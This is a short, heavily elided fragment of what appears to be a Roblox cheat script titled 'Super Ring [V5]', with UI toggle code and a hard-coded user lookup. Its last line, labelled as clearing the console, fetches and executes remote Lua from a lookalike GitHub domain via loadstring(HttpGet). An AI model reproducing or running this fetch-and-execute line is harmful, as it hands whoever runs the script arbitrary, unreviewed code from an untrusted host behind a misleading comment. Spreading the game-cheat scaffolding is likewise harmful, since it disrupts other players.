...
Watermark.Text = "Super Ring [V5] by C00lkidRevenge"
...
ToggleButton.MouseButton1Click:Connect(function()
    ...
    ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(128, 128, 128)
    playSound("12221967")
end)
...
local userId = Players:GetUserIdFromNameAsync("666mmm_666RRR")
...
-- Clear the console
loadstring(game:HttpGet("https://raw.githubcontent.com/TheScripterofTheUniverse/ConsoleClear/main/main/ConsoleFuck.lua", true)) ()
